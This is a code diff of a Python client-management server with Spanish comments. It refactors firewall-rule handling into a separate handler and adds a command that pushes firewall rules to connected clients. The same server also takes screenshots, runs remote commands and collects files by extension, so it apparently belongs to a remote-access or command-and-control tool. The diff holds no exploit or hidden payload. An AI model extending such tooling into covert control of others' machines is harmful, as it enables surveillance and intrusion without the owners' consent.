@@ -11,6 +11,7 @@ from server.handlers.screenshot_handler import ScreenshotHandler
 from server.handlers.directory_handler import DirectoryHandler
 from server.handlers.file_handler import FileHandler
 from server.handlers.command_handler import CommandHandler
+from server.handlers.firewall_handler import FirewallHandler
 
 class ClientManager:
     """Administra clientes conectados y procesa sus respuestas."""
@@ -26,6 +27,7 @@ class ClientManager:
         self.screenshot_handler = ScreenshotHandler(self)
         self.file_handler = FileHandler(self)
         self.command_handler = CommandHandler(self)
+        self.firewall_handler = FirewallHandler(self)
         
     def esperar_respuesta_accion(self, accion, cliente_id=None):
         """Espera la(s) respuesta(s) de uno o varios clientes para una acción dada."""
@@ -86,7 +88,8 @@ class ClientManager:
                 self.response_waiter.notificar_respuesta(cliente['id'], accion)
                 
             elif accion == "regla_firewall_agregada":
-                self._procesar_regla_firewall_agregada(datos_dict, cliente_id)
+                self.firewall_handler._procesar_regla_firewall_agregada(datos_dict, cliente_id)
+                self.response_waiter.notificar_respuesta(cliente['id'], accion)
                 
             elif accion == "archivos_extension_enviados":
                 self._procesar_archivos_extension_enviados(datos_dict, cliente_id)
@@ -95,21 +98,6 @@ class ClientManager:
             self.console.print(f"[bold red][!] Error al decodificar respuesta del cliente: {datos}[/bold red]")
         except Exception as e:
             self.console.print(f"[bold red][!] Error al procesar respuesta del cliente: {e}[/bold red]")
-    
-    def _procesar_regla_firewall_agregada(self, datos_dict, cliente_id):
-        """Procesa una regla de firewall agregada."""
-        nombre_regla = datos_dict.get("nombre_regla")
-        ip = datos_dict.get("ip")
-        puerto = datos_dict.get("puerto")
-        accion_firewall = datos_dict.get("accion_firewall")
-        resultado = datos_dict.get("resultado")
-        
-        self.console.print(f"\n{cliente_id} [bold green]🔥 Regla de Firewall procesada:[/bold green]")
-        self.console.print(f"{cliente_id} Nombre: {nombre_regla}")
-        self.console.print(f"{cliente_id} IP: {ip}")
-        self.console.print(f"{cliente_id} Puerto: {puerto}")
-        self.console.print(f"{cliente_id} Acción: {accion_firewall}")
-        self.console.print(f"{cliente_id} Resultado: {resultado}")
     
     def _procesar_archivos_extension_enviados(self, datos_dict, cliente_id):
         """Procesa archivos enviados por extensión."""
@@ -185,6 +173,10 @@ class ClientManager:
         
         return self.comprobar_respuesta(exito_envio, "archivo_enviado", cliente_id)
     
+    def enviar_comando_agregar_regla_firewall(self, nombre, ip, puerto, accion, cliente_id=None):
+        exito_envio = self.firewall_handler.enviar_comando_agregar_regla(nombre, ip, puerto, accion, cliente_id)
+
+        return self.comprobar_respuesta(exito_envio, "regla_firewall_agregada", cliente_id)
     def comprobar_respuesta(self, exito_envio, accion_esperada, cliente_id=None):
         if not exito_envio:
             return False
